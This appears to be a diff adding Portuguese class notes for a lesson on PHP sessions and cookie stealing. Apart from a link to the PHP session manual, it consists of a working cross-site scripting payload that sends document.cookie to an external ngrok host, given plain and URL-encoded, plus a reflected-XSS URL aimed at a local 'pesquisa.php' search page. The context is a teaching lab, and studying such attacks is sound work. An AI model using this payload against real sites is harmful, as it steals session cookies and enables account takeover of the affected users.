@@ -1,0 +1,44 @@
+
+
+Aula 4 -> Sessões PHP + Exploit Cookie Stealing
+
+
+
+Sessão 
+
+
+https://www.php.net/manual/pt_BR/book.session.php
+
+
+Cookie de sessão
+
+https://2cba-45-183-93-11.sa.ngrok.io
+
+
+
+
+<script>
+var imag=new Image;
+imag.src="https://2cba-45-183-93-11.sa.ngrok.io/"+document.cookie;
+</script>
+
+
+
+
+
+
+<script>var imag=new Image;imag.src="https://2cba-45-183-93-11.sa.ngrok.io/"%2Bdocument.cookie;</script>
+
+Url Vulnerável:
+
+http://localhost:8080/pesquisa.php?pesquisa=<script>var imag=new Image;imag.src="https://2cba-45-183-93-11.sa.ngrok.io/"%2Bdocument.cookie;</script>
+
+
+
+
+
+
+
+
+
+
